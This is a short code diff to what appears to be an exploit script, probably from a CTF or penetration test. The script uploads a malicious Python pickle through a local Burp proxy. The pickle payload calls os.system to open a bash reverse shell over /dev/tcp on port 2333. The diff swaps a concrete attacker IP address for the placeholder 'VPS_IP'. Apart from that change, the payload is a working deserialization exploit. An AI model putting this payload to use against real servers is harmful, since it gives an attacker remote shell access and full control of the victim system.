@@ -8,7 +8,7 @@ burp_proxy = {'http':'http://127.0.0.1:8080'}
 def upload_pickle_payload():
     data = {'sample_0_type' : '/app/models'}
 
-    pkl_payload = b'''(S'bash -c "bash -i >& /dev/tcp/121.40.72.38/2333 0>&1"'
+    pkl_payload = b'''(S'bash -c "bash -i >& /dev/tcp/VPS_IP/2333 0>&1"'
 ios
 system
 .'''
